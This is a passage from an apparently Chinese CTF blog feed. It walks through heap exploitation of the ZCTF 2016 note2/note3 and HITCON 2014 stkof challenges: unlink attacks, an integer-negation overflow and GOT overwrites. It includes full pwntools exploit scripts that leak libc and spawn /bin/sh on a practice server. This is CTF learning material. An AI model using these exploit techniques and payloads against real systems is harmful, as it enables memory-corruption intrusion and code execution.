+ p64(<span class="number">0xa0</span>) + p64(<span class="number">0x90</span>)</span><br><span class="line">newnote(<span class="number">0</span>,content)</span><br><span class="line">deletenote(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">atoi_got = elf.got[<span class="string">&#x27;atoi&#x27;</span>]</span><br><span class="line">content = <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x18</span> + p64(atoi_got)</span><br><span class="line">editnote(<span class="number">0</span>, <span class="number">1</span>, content)</span><br><span class="line">shownote(<span class="number">0</span>)</span><br><span class="line">ru(<span class="string">b&#x27;is &#x27;</span>)</span><br><span class="line">atoi_ad=u64(r(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">p(<span class="string">&#x27;atoi&#x27;</span>,atoi_ad)</span><br><span class="line">libc=LibcSearcher(<span class="string">&#x27;atoi&#x27;</span>,atoi_ad)</span><br><span class="line">base=atoi_ad-libc.dump(<span class="string">&#x27;atoi&#x27;</span>)</span><br><span class="line">system=libc.dump(<span class="string">&#x27;system&#x27;</span>)+base</span><br><span class="line">content = p64(system)</span><br><span class="line">editnote(<span class="number">0</span>, <span class="number">1</span>, content)</span><br><span class="line">ru(<span class="string">b&#x27;option---&gt;&gt;&#x27;</span>)</span><br><span class="line">sl(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h2 id="2016-ZCTF-note3"><a href="#2016-ZCTF-note3" class="headerlink" title="2016-ZCTF-note3"></a>2016-ZCTF-note3</h2><p><a href="https://files.buuoj.cn/files/569bb2532339a0bd669f5d2457526ba7/zctf_2016_note3">https://files.buuoj.cn/files/569bb2532339a0bd669f5d2457526ba7/zctf_2016_note3</a></p><p>和note2一样的保护</p><p>和note2相比，这次可以申请最多7个chunk，全局指针数组0x6020C0的0是最近申请或修改过的指针，后面依次顺序是malloc的chunk</p><p>这次没有了show函数帮我方便的leak地址</p><p>老的堆溢出的漏洞依旧存在</p><p>还有了新的堆溢出方式</p><h3 id="第一种溢出方式"><a href="#第一种溢出方式" class="headerlink" title="第一种溢出方式"></a>第一种溢出方式</h3><p>和之前一下自定义read时-1转换为无符号读取即可</p><h3 id="第二种溢出方式"><a href="#第二种溢出方式" class="headerlink" title="第二种溢出方式"></a>第二种溢出方式</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">edit</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 v0; <span class="comment">// rax</span></span><br><span class="line">  __int64 v1; <span class="comment">// rax</span></span><br><span class="line">  __int64 v3; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Input the id of the note:&quot;</span>);</span><br><span class="line">  v0 = getsize();</span><br><span class="line">  v3 = v0 % <span class="number">7</span>;</span><br><span class="line">  <span class="keyword">if</span> ( v0 % <span class="number">7</span> &gt;= v0 )</span><br><span class="line">  &#123;</span><br><span class="line">    v1 = (__int64)*(&amp;ptr + v3);</span><br><span class="line">    <span class="keyword">if</span> ( v1 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Input the new content:&quot;</span>);</span><br><span class="line">      myread((__int64)*(&amp;ptr + v3), ptr_st[v3 + <span class="number">8</span>], <span class="number">10</span>);</span><br><span class="line">      ptr_st[<span class="number">0</span>] = (__int64)*(&amp;ptr + v3);</span><br><span class="line">      LODWORD(v1) = <span class="built_in">puts</span>(<span class="string">&quot;Edit success&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    LODWORD(v1) = <span class="built_in">puts</span>(<span class="string">&quot;please input correct id.&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> v1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">__int64 <span class="title function_">getsize</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 v1; <span class="comment">// [rsp+8h] [rbp-38h]</span></span><br><span class="line">  <span class="type">char</span> nptr[<span class="number">40</span>]; <span class="comment">// [rsp+10h] [rbp-30h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v3; <span class="comment">// [rsp+38h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  myread((__int64)nptr, <span class="number">32LL</span>, <span class="number">10</span>);</span><br><span class="line">  v1 = atol(nptr);</span><br><span class="line">  <span class="keyword">if</span> ( v1 &lt; <span class="number">0</span> )</span><br><span class="line">    <span class="keyword">return</span> -v1;</span><br><span class="line">  <span class="keyword">return</span> v1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p><strong>NEG指令 -x&#x3D;~x+1</strong></p><p>当x为该位数可以表示的最大负数时，比如int 最大负数0x80000000 </p><img src="/2023/03/15/2016-ZCTF-note2-and-note3/image-20230315233602653.png" alt="image-20230315233602653" style="zoom:67%;"><p>取反+1还是0x80000000 </p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line">    <span class="type">int</span> v2 = <span class="number">-2147483648</span>;</span><br><span class="line">    <span class="keyword">if</span> (v2==-v2) &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;ohhhhh&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2023/03/15/2016-ZCTF-note2-and-note3/image-20230315233803481.png" alt="image-20230315233803481"></p></blockquote><p>这里我们输入最大负整数-9223372036854775808，getsize返回-v1还是这个值给到edit里的v0，v3&#x3D;-1，同时满足 v0 % 7 &gt;&#x3D; v0</p><p><code>myread((__int64)*(&amp;ptr + v3), ptr_st[v3 + 8], 10);</code></p><p>这样我们修改ptr[-1]也就是最近使用的堆，大小为ptr_st[-1 + 8]，第6个chunk的大小，我们把第6个chunk地址申请的比最近使用的那个大就可以实现堆溢出</p><h3 id="第三种"><a href="#第三种" class="headerlink" title="第三种"></a>第三种</h3><p>new时检测了chunk个数是不是大于7，但是只是puts，并没有实质性的阻值申请，申请后会把chunk8的ptr放到ptr数组开头的同时会把ptr放到，chunk1的size指针地址里，改变了chunk1的size，可以实现溢出</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> ( i == <span class="number">7</span> )</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Note is full, add fail&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Input the length of the note content:(less than 1024)&quot;</span>)</span><br><span class="line">      </span><br><span class="line">  *(&amp;ptr + i) = v3;</span><br><span class="line">  ptr_st[i + <span class="number">8</span>] = size;</span><br><span class="line">  ptr_st[<span class="number">0</span>] = (__int64)*(&amp;ptr + i);</span><br></pre></td></tr></table></figure><h3 id="其他好说"><a href="#其他好说" class="headerlink" title="其他好说"></a>其他好说</h3><p>常规构造unlink后，没有show方便泄露地址，我们可以自己利用puts自己泄露</p><p>改写freegot内容为puts，<strong>这里改写时要注意发送7个字节即可p64(puts_plt)[:-1]，如果8个字节+一个&#x2F;n,&#x2F;n最后又被置零，所以覆盖freegot时，会误覆盖freegot的下一个putsgot最低一个字节为\x00造成程序崩溃</strong></p><p>改写另一个chunk指针为puts_plt，free这个chunk可以泄露地址，</p><p>再改写atoi-got为system即可</p><p><img src="/2023/03/15/2016-ZCTF-note2-and-note3/image-20230316002002255.png" alt="image-20230316002002255"></p><h3 id="EXP-1"><a href="#EXP-1" class="headerlink" title="EXP"></a>EXP</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line">pwnfile=<span class="string">&#x27;./note3&#x27;</span></span><br><span class="line">elf = ELF(pwnfile)</span><br><span class="line">rop = ROP(pwnfile)</span><br><span class="line"><span class="keyword">if</span> args[<span class="string">&#x27;REMOTE&#x27;</span>]:</span><br><span class="line">    io = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="string">&#x27;25662&#x27;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = process(pwnfile)</span><br><span class="line">r = <span class="keyword">lambda</span> x: io.recv(x)</span><br><span class="line">ra = <span class="keyword">lambda</span>: io.recvall()</span><br><span class="line">rl = <span class="keyword">lambda</span>: io.recvline(keepends=<span class="literal">True</span>)</span><br><span class="line">ru = <span class="keyword">lambda</span> x: io.recvuntil(x, drop=<span class="literal">True</span>)</span><br><span class="line">s = <span class="keyword">lambda</span> x: io.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x: io.sendline(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> x, y: io.sendafter(x, y)</span><br><span class="line">sla = <span class="keyword">lambda</span> x, y: io.sendlineafter(x, y)</span><br><span class="line">ia = <span class="keyword">lambda</span>: io.interactive()</span><br><span class="line">c = <span class="keyword">lambda</span>: io.close()</span><br><span class="line">li = <span class="keyword">lambda</span> x: log.info(x)</span><br><span class="line">db = <span class="keyword">lambda</span> x : gdb.attach(io,x)</span><br><span class="line">p =<span class="keyword">lambda</span> x,y:success(x+<span class="string">&#x27;--&gt;&#x27;</span>+<span class="built_in">hex</span>(y))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">newnote</span>(<span class="params">length, content</span>):</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;option---&gt;&gt;&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;(less than 1024)&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(length).encode())</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;content:&#x27;</span>)</span><br><span class="line">    io.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">shownote</span>(<span class="params"><span class="built_in">id</span></span>):</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;option---&gt;&gt;&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;note:&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(<span class="built_in">id</span>).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">editnote</span>(<span class="params"><span class="built_in">id</span>,data</span>):</span><br><span class="line">    io.recvuntil(<span class="string">&#x27;&gt;&gt;&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&#x27;note:&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(<span class="built_in">id</span>))</span><br><span class="line">    io.recvuntil(<span class="string">&#x27;ent:&#x27;</span>)</span><br><span class="line">    io.sendline(data)</span><br><span class="line">    io.recvuntil(<span class="string">&#x27;success&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">deletenote</span>(<span class="params"><span class="built_in">id</span></span>):</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;option---&gt;&gt;&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;note:&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(<span class="built_in">id</span>).encode())</span><br><span class="line"><span class="comment"># db(&#x27;b *0x400B31&#x27;)# new</span></span><br><span class="line"><span class="comment"># db(&#x27;b *0x400BFB&#x27;) # delete</span></span><br><span class="line"><span class="comment"># db(&#x27;b *0x400CDA&#x27;)#edit</span></span><br><span class="line"><span class="comment"># db(&#x27;b *0x0400C89&#x27;)</span></span><br><span class="line">ptr = <span class="number">0x6020C8</span></span><br><span class="line">fakefd = ptr - <span class="number">0x18</span></span><br><span class="line">fakebk = ptr - <span class="number">0x10</span></span><br><span class="line">content = <span class="string">b&#x27;a&#x27;</span> * <span class="number">8</span> + p64(<span class="number">0xa1</span>) + p64(fakefd) + p64(fakebk) + <span class="string">b&#x27;b&#x27;</span> * <span class="number">0x48</span></span><br><span class="line">newnote(<span class="number">0x80</span>, content)</span><br><span class="line">newnote(<span class="number">0</span>, <span class="string">&#x27;a&#x27;</span> * <span class="number">8</span>)</span><br><span class="line">newnote(<span class="number">0x80</span>, <span class="string">&#x27;b&#x27;</span> * <span class="number">16</span>)</span><br><span class="line">deletenote(<span class="number">1</span>)</span><br><span class="line">content = <span class="string">b&#x27;a&#x27;</span> * <span class="number">16</span> + p64(<span class="number">0xa0</span>) + p64(<span class="number">0x90</span>)</span><br><span class="line">newnote(<span class="number">0</span>,content)</span><br><span class="line">deletenote(<span class="number">2</span>)</span><br><span class="line">free_got = elf.got[<span class="string">&#x27;free&#x27;</span>]</span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">atoi_got = elf.got[<span class="string">&#x27;atoi&#x27;</span>]</span><br><span class="line">puts_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x18</span>+p64(free_got)+p64(puts_got)+p64(atoi_got)</span><br><span class="line">editnote(<span class="number">0</span>,payload)</span><br><span class="line">editnote(<span class="number">0</span>,p64(puts_plt)[:-<span class="number">1</span>])</span><br><span class="line">deletenote(<span class="number">1</span>)</span><br><span class="line">rl()</span><br><span class="line">puts_ad=u64(r(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">p(<span class="string">&#x27;puts&#x27;</span>,puts_ad)</span><br><span class="line">libc=LibcSearcher(<span class="string">&#x27;puts&#x27;</span>,puts_ad)</span><br><span class="line">base=puts_ad-libc.dump(<span class="string">&#x27;puts&#x27;</span>)</span><br><span class="line">system=libc.dump(<span class="string">&#x27;system&#x27;</span>)+base</span><br><span class="line">editnote(<span class="number">2</span>,p64(system))</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;option---&gt;&gt;&#x27;</span>)</span><br><span class="line">sl(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> Unlink </tag>
            
            <tag> Integer Overflow </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Unlink-2014-HITCON-stkof</title>
      <link href="/2023/03/14/Unlink-2014-HITCON-stkof/"/>
      <url>/2023/03/14/Unlink-2014-HITCON-stkof/</url>
      
        <content type="html"><![CDATA[<h2 id="Unlink"><a href="#Unlink" class="headerlink" title="Unlink"></a>Unlink</h2><p>在free堆块时，要满足释放的该chunk不在tcache(带着chunkhead，0x410)或fastbin(0x80)范围内，free的chunk物理地址前或后有freechunk时会进行unlink操作，unlink就是把这个chunk从双向链表里拿下来</p><p>调用关系大致如下</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> unlink(AV, P, BK, FD)</span></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> _int_free (mstate av, mchunkptr p, <span class="type">int</span> have_lock)</span><br><span class="line"><span class="built_in">free</span>()&#123;</span><br><span class="line">    _int_free()&#123;</span><br><span class="line">        unlink();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>unlink是一个宏</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> unlink(AV, P, BK, FD) &#123;                                            </span></span><br><span class="line">    FD = P-&gt;fd;                                      </span><br><span class="line">    BK = P-&gt;bk;                                      </span><br><span class="line">    <span class="keyword">if</span> (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, <span class="number">0</span>))              </span><br><span class="line">      malloc_printerr (check_action, <span class="string">&quot;corrupted double-linked list&quot;</span>, P, AV);  </span><br><span class="line">    <span class="keyword">else</span> &#123;                                      </span><br><span class="line">        FD-&gt;bk = BK;                                  </span><br><span class="line">        BK-&gt;fd = FD;                                  </span><br><span class="line">        <span class="keyword">if</span> (!in_smallbin_range (P-&gt;size)                      </span><br><span class="line">            &amp;&amp; __builtin_expect (P-&gt;fd_nextsize != <span class="literal">NULL</span>, <span class="number">0</span>)) &#123;              </span><br><span class="line">        <span class="keyword">if</span> (__builtin_expect (P-&gt;fd_nextsize-&gt;bk_nextsize != P, <span class="number">0</span>)      </span><br><span class="line">        || __builtin_expect (P-&gt;bk_nextsize-&gt;fd_nextsize != P, <span class="number">0</span>))    </span><br><span class="line">          malloc_printerr (check_action,      </span><br><span class="line">                   <span class="string">&quot;corrupted double-linked list (not small)&quot;</span>,    </span><br><span class="line">                   P, AV);      </span><br><span class="line">            <span class="keyword">if</span> (FD-&gt;fd_nextsize == <span class="literal">NULL</span>) &#123;                      </span><br><span class="line">                <span class="keyword">if</span> (P-&gt;fd_nextsize == P)                      </span><br><span class="line">                  FD-&gt;fd_nextsize = FD-&gt;bk_nextsize = FD;              </span><br><span class="line">                <span class="keyword">else</span> &#123;                                  </span><br><span class="line">                    FD-&gt;fd_nextsize = P-&gt;fd_nextsize;                  </span><br><span class="line">                    FD-&gt;bk_nextsize = P-&gt;bk_nextsize;                  </span><br><span class="line">                    P-&gt;fd_nextsize-&gt;bk_nextsize = FD;                  </span><br><span class="line">                    P-&gt;bk_nextsize-&gt;fd_nextsize = FD;                  </span><br><span class="line">                  &#125;                                  </span><br><span class="line">              &#125; <span class="keyword">else</span> &#123;                                  </span><br><span class="line">                P-&gt;fd_nextsize-&gt;bk_nextsize = P-&gt;bk_nextsize;              </span><br><span class="line">                P-&gt;bk_nextsize-&gt;fd_nextsize = P-&gt;fd_nextsize;              </span><br><span class="line">              &#125;                                      </span><br><span class="line">          &#125;                                      </span><br><span class="line">      &#125;                                          </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 由于 P 已经在双向链表中，所以有两个地方记录其大小，所以检查一下其大小是否一致(size检查)</span></span><br><span class="line"><span class="keyword">if</span> (__builtin_expect (chunksize(P) != prev_size (next_chunk(P)), <span class="number">0</span>))      \</span><br><span class="line">      malloc_printerr (<span class="string">&quot;corrupted size vs. prev_size&quot;</span>);               \</span><br><span class="line"><span class="comment">// 检查 fd 和 bk 指针(双向链表完整性检查)</span></span><br><span class="line"><span class="keyword">if</span> (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, <span class="number">0</span>))                      \</span><br><span class="line">  malloc_printerr (check_action, <span class="string">&quot;corrupted double-linked list&quot;</span>, P, AV);  \</span><br><span class="line"></span><br><span class="line">  <span class="comment">// largebin 中 next_size 双向链表完整性检查 </span></span><br><span class="line">              <span class="keyword">if</span> (__builtin_expect (P-&gt;fd_nextsize-&gt;bk_nextsize != P, <span class="number">0</span>)              \</span><br><span class="line">                || __builtin_expect (P-&gt;bk_nextsize-&gt;fd_nextsize != P, <span class="number">0</span>))    \</span><br><span class="line">              malloc_printerr (check_action,                                      \</span><br><span class="line">                               <span class="string">&quot;corrupted double-linked list (not small)&quot;</span>,    \</span><br><span class="line">                               P, AV);</span><br></pre></td></tr></table></figure><p>Unlink这里会有几个检测</p><ul><li>检查与被释放chunk相邻高地址的chunk的prevsize的值是否等于被释放chunk的size大小</li><li>检查与被释放chunk相邻高地址的chunk的size的P标志位是否为0</li><li>经常被释放chunk的fd的bk是否指向p，被释放chunk的bk的fd是否指向p</li></ul><p>我们着重分析一下这里</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">FD = P-&gt;fd;                                      </span><br><span class="line">BK = P-&gt;bk;                                      </span><br><span class="line"><span class="keyword">if</span> (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, <span class="number">0</span>))              </span><br><span class="line">  malloc_printerr (check_action, <span class="string">&quot;corrupted double-linked list&quot;</span>, P, AV);  </span><br><span class="line"><span class="keyword">else</span> &#123;                                      </span><br><span class="line">    FD-&gt;bk = BK;                                  </span><br><span class="line">    BK-&gt;fd = FD;</span><br></pre></td></tr></table></figure><p>我们怎么绕过检测通过unlink实现任意地址读写呢</p><p>在64位程序下，我们被unlink的chunk是P</p><p>我们伪造chunk P </p><p>P-&gt;fd &#x3D; target addr -0x18</p><p>P-&gt;bk &#x3D; expect value</p><p>FD &#x3D; P-&gt;fd &#x3D; target-0x18</p><p>BK &#x3D; P-&gt;bk &#x3D; expect value</p><p><strong>FD-&gt;bk &#x3D; BK —&gt;*(target-0x18+0x18)&#x3D;*(P-&gt;fd+0x18)&#x3D;BK&#x3D;expect value</strong>      </p><p><strong>BK-&gt;fd &#x3D; FD —&gt;*(expect value+0x10)&#x3D;FD&#x3D;target-0x18&#x3D;P-&gt;fd</strong></p><p>实现了任意地址读写但是没有绕过 if (__builtin_expect (FD-&gt;bk !&#x3D; P || BK-&gt;fd !&#x3D; P, 0)) malloc_printerr (check_action, “corrupted double-linked list”, P, AV); </p><p>也就是我们需要*(FD+0x18)&#x3D;P *(BK+0x10)&#x3D;P</p><p>如果我们可以在堆地址的某个地方伪造或者找到一个合适fake_chunk，这个chunk地址可以泄露出来，且符合&#x3D;P要求，我们把这个地址写到chunk P的fd和bk，在unlink时会发生什么呢</p><p>通过上面的分析，可以得知，</p><ul><li>第一步*(target)||*(P-&gt;fd+0x18)写入expect value||BK</li><li>第二步会在*(expect value+0x10)||*(p-&gt;bk+10)写入target-0x18||P-&gt;fd</li><li>如果我们可以控制这个地址内容，也就是可以using after free，通过修改该地址内容就可以实现hook</li></ul><h2 id="2014-HITCON-stkof"><a href="#2014-HITCON-stkof" class="headerlink" title="2014 HITCON stkof"></a>2014 HITCON stkof</h2><p><a href="https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/heap/unlink/2014_hitcon_stkof">https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/heap/unlink/2014_hitcon_stkof</a></p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">grxer@Ubuntu16 ~/D/p/heap&gt; checksec stkof</span><br><span class="line">[*] &#x27;/home/grxer/Desktop/pwn/heap/stkof&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure><p>程序里有用的功能</p><ul><li>alloc分配内存，并写到bss段0x602140的全局数组里</li><li>free释放并置零指针，好评尼</li><li>fill填充申请堆区</li></ul><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">signed</span> __int64 <span class="title function_">fill</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> idx; <span class="comment">// [rsp+8h] [rbp-88h]</span></span><br><span class="line">  __int64 size; <span class="comment">// [rsp+10h] [rbp-80h]</span></span><br><span class="line">  <span class="type">char</span> *ptr; <span class="comment">// [rsp+18h] [rbp-78h]</span></span><br><span class="line">  <span class="type">char</span> s[<span class="number">104</span>]; <span class="comment">// [rsp+20h] [rbp-70h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v6; <span class="comment">// [rsp+88h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v6 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  fgets(s, <span class="number">16</span>, <span class="built_in">stdin</span>);</span><br><span class="line">  idx = atol(s);</span><br><span class="line">  <span class="keyword">if</span> ( idx &gt; <span class="number">0x100000</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0xFFFFFFFF</span>LL;</span><br><span class="line">  <span class="keyword">if</span> ( !globals[idx] )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0xFFFFFFFF</span>LL;</span><br><span class="line">  fgets(s, <span class="number">16</span>, <span class="built_in">stdin</span>);</span><br><span class="line">  size = atoll(s);</span><br><span class="line">  ptr = globals[idx];</span><br><span class="line">  <span class="keyword">for</span> ( i = fread(ptr, <span class="number">1uLL</span>, size, <span class="built_in">stdin</span>); i &gt; <span class="number">0</span>; i = fread(ptr, <span class="number">1uLL</span>, size, <span class="built_in">stdin</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    ptr += i;</span><br><span class="line">    size -= i;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( size )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0xFFFFFFFF</span>LL;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里的fill是有漏洞的，我们可以限定大小的堆里写入任意大小的数据造成堆溢出</p><p><strong>堆溢出给了我们伪造unlink_chunk的机会，global指针数组给了我们伪造fd bk绕过检测的机会</strong></p><h3 id="缓冲区问题"><a href="#缓冲区问题" class="headerlink" title="缓冲区问题"></a>缓冲区问题</h3><p>alloc(16)<br>alloc(32)<br>alloc(48)</p><p>我们这里先alloc三个堆块</p><p><img src="/2023/03/14/Unlink-2014-HITCON-stkof/image-20230314233831972.png" alt="image-20230314233831972"></p><p>这里发现多了两个堆块在alloc(16)中间，这是因为程序本身没有进行 setbuf 操作，所以在执行输入输出操作的时候会申请缓冲区。在第一个malloc时，刚好有fget和printf</p><p>第一个chunk被包围不好利用，所以我们选择绕过第一个</p><h3 id="实现fill地址可控"><a href="#实现fill地址可控" class="headerlink" title="实现fill地址可控"></a>实现fill地址可控</h3><p>这里我们申请三个堆块，</p><p>alloc(0x10)<br>alloc(0x30)<br>alloc(0x80)</p><p>利用堆溢出，可以伪造unlink——chunk，我们选择在堆块二伪造</p><p>chunkhead需要0x10字节，fd bk需要0x10字节，后面数据需要0x10字节，第二个堆块至少0x30</p><p>第三个堆块需要在free的时候出发unlink操作，需要大于fastbin最大容量，申请0x80即可</p><ul><li>chunkhead伪造p64(0x0)+p64(0x30)即可</li><li>fd和bk这里我们需要FD-&gt;bk &#x3D; P &amp;&amp; BK-&gt;fd &#x3D; P<ul><li>这里我们可以利用globa指针数组里内容伪造双向链表</li><li>这时候我们的伪造unlink堆P&#x3D;0x0000000002c87450我们选取0x602138作为fd刚好满足FD-&gt;bk &#x3D; P</li><li><img src="/2023/03/14/Unlink-2014-HITCON-stkof/image-20230315001634637.png" alt="image-20230315001634637"></li><li>选取0x602140作为bk刚好满足BK-&gt;fd &#x3D; P</li><li><img src="/2023/03/14/Unlink-2014-HITCON-stkof/image-20230315001757168.png" alt="image-20230315001757168"></li><li>这里我们只需要关系FD的bk和BK的fd就好其他和我们unlink无关比如说我们FD的fd，我管你指向谁，我们不关心</li></ul></li></ul><p>payload&#x3D;p64(0x0)+p64(0x31)+p64(head+16-0x18)+p64(head+16-0x10)+p64(0x00)+p64(0x6666)</p><p>伪造好unlinkchunk，伪造chunk3，把prevsize改写为伪造chunk大小，把size <strong>PREV_INUSE</strong>位置零</p><p>payload +&#x3D; p64(0x30)+p64(0x90)</p><p>然后我们去释放chunk3 触发unlink</p><p>按照我们先前的分析</p><ul><li>先把fd+0x18&#x3D;0x602138+0x18&#x3D;0x602150地址写入bk&#x3D;0x602140</li><li>再把bk+0x10&#x3D;0x602140+0x10&#x3D;0x602150地址写入fd&#x3D;0x602138</li></ul><p><img src="/2023/03/14/Unlink-2014-HITCON-stkof/image-20230315002921373.png" alt="image-20230315002921373"></p><p>和分析一样</p><h3 id="任意地址读写，leak数据，拿shell走人"><a href="#任意地址读写，leak数据，拿shell走人" class="headerlink" title="任意地址读写，leak数据，拿shell走人"></a>任意地址读写，leak数据，拿shell走人</h3><p>这样我们fill chunk2时就可以，修改全局指针数组为任何地址，再通过fill修改这个地址为任何值</p><p>payload &#x3D; p64(0)+p64(free_got)+p64(puts_got)+p64(atoi_got)</p><p>edit(2,len(payload),payload)</p><p>这样s[0]&#x3D;free_got，s[1]&#x3D;puts_got，s[2]&#x3D;atoi_got</p><p><img src="/2023/03/14/Unlink-2014-HITCON-stkof/image-20230315005329559.png" alt="image-20230315005329559"></p><p>payload &#x3D; p64(puts_plt)<br>edit(0,len(payload),payload)<br>free(1)</p><p>先把freegot改为puts plt，这样free(1)&#x3D;&#x3D;puts(puts_got)</p><p>leak出libc后</p><p>payload &#x3D; p64(system)<br>edit(2,len(payload),payload)</p><p>把atoi_got改为system。利用choice &#x3D; atoi(nptr);在输入时构造binsh即可payload &#x3D; ‘&#x2F;bin&#x2F;sh\x00’<br>io.sendline(payload)</p><p><img src="/2023/03/14/Unlink-2014-HITCON-stkof/image-20230315010413491.png" alt="image-20230315010413491"></p><h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h3><figure class="highlight 